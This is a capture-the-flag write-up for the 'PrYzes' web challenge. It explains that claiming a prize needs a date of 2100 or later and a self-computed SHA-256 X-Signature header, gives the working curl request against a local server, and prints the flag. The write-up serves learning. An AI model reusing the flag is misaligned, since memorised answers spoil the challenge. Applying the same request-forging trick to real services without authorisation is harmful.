# PrYzes

### Category

Web

### Description

A Python enthusiast created a website to distribute prizes, but currently, you are unable to claim them. Discover a method to successfully claim a prize and obtain the flag!

Format : Hero{flag}<br>
Author : xanhacks

### Files

- [PrYzes.zip](PrYzes.zip)

### Write Up

To solve the challenge you need to validate two things:

1. The date is geater than 2100 (`if date_obj.year >= 2100:`)
2. A `X-Signature` HTTP header must be present with the sha256sum of the request body (`expected_signature = compute_sha256(json_data)`)

You can solve this challenge with a simple curl command:

```bash
$ export DATA='{"date": "01/01/2100"}';
$ curl 'http://127.0.0.1:5000/api/prizes' -d "$DATA" -H 'Content-Type: application/json' -H "X-Signature: $(echo -n $DATA|sha256sum|cut -d' ' -f1)"
{"message":"Hero{PrYzes_4r3_4m4z1ng!!!9371497139}"}
```

### Flag

Hero{PrYzes_4r3_4m4z1ng!!!9371497139}